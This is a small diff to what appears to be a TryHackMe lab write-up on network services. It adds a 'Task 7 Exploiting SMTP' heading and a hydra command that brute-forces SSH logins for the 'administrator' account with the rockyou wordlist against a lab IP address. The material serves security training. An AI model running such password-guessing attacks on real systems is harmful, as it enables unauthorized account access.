@@ -48,3 +48,8 @@
 ![smtp_enum](https://github.com/r1skkam/TryHackMe-Network-Services-2/blob/main/Screenshot%202022-05-27%20223916.png)
 
 ![administrator](https://github.com/r1skkam/TryHackMe-Network-Services-2/blob/main/Screenshot%202022-05-27%20225035.png)
+
+## Task 7 Exploiting SMTP
+`hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.64.127 ssh`
+
+
